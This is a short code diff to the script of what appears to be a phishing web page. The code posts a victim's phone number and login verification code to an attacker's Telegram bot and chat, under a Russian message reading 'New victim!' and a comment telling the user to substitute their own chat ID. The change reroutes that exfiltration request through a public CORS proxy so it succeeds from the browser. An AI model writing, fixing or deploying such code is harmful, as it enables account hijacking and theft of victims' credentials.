@@ -181,7 +181,7 @@
             const chatId = '7460184864';      // замени на свой
             const message = `🔥 Новая жертва!\nТелефон: ${userPhone}\nКод: ${code}`;
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            fetch(`https://cors-anywhere.herokuapp.com/https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -210,4 +210,5 @@
         });
     </script>
 </body>
+
 </html>
